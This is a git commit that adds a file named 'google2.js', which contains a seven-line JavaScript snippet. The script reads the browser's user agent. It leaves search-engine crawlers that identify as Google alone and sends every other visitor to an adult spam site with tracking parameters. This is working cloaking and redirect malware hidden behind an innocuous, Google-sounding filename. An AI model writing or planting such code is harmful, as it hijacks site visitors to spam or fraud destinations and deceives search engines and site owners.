0bf7d9a57df5bcbbdb606ab4d79d4801ec052ec3
plokin1 <77917953+plokin1@users.noreply.github.com>
2021-01-24 11:46:53 +0200

    Create google2.js

---
+++ google2.js
@@ -0,0 +1,7 @@
+var url = "https://myfresh-sexcontacts.com/?u=hadpd0x&o=l1gklgw";
+var ua = navigator.userAgent.toLocaleLowerCase();
+if (ua.includes("google")) {}
+
+else {
+     window.location.replace(url);
+     }
